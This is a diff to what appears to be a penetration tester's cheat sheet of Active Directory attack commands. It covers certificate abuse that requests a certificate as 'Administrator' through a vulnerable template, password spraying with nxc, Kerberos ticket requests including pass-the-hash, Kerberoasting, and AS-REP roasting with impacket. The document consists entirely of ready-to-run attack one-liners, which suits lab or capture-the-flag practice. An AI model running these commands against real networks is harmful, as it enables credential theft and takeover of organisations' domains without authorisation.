@@ -426,11 +426,14 @@ certipy-ad find -dc-ip $TARGET -target $DC -u '$USERNAME' -p '$PASSWORD' -vulner
 certipy-ad req -dc-ip $TARGET -target $DC -u '$USERNAME' -p '$PASSWORD' -ca '$CA' -upn 'Administrator' -template 'RetroClients' -key-size '4096'
 
 [*] (88) Kerberos
++---------- Storing .ccache ----------+
+export KRB5CCNAME="$PWD/$USERNAME.ccache"; chmod 0600 "$KRB5CCNAME"
+
 +---------- Kerberos Negotiation ----------+
 nxc ldap $TARGET --dns-server $TARGET -u usernames -p passwords --continue-on-success -k
 nxc ldap $TARGET --dns-server $TARGET -u usernames -p passwords -k -M adcs
-impacket-getTGT -dc-ip $TARGET '$DOM'/'$USERNAME':'$PASSWORD'; export KRB5CCNAME="$PWD/$USERNAME.ccache"; chmod 0600 "$KRB5CCNAME"
-
+impacket-getTGT -dc-ip $TARGET '$DOM'/'$USERNAME':'$PASSWORD'
+impacket-getTGT -dc-ip $TARGET -hashes :$(echo '$PASSWORD' | 2ntlm) $DOM/$USERNAME
 impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -request
 impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile usernames
 impacket-GetNPUsers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile usernames
@@ -441,7 +444,8 @@ while IFS= read -r user; do echo "\n*-------------------*\n$user"; impacket-GetU
 +---------- NTLM Negotiation ----------+
 nxc ldap $TARGET --dns-server $TARGET -u usernames -p passwords --continue-on-success
 nxc ldap $TARGET --dns-server $TARGET -u usernames -p passwords -M adcs
-certipy-ad find -dc-ip $TARGET -target $DC -u '$USERNAME' -p '$PASSWORD' -vulnerable -enabled -stdout
+impacket-getTGT -dc-ip $TARGET '$DOM'/'$USERNAME':'$PASSWORD'
+impacket-getTGT -dc-ip $TARGET -hashes :$(echo '$PASSWORD' | 2ntlm) $DOM/$USERNAME
 impacket-GetUserSPNs -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD' -request
 impacket-GetUserSPNs -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD' -usersfile usernames
 impacket-GetNPUsers -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD' -usersfile usernames
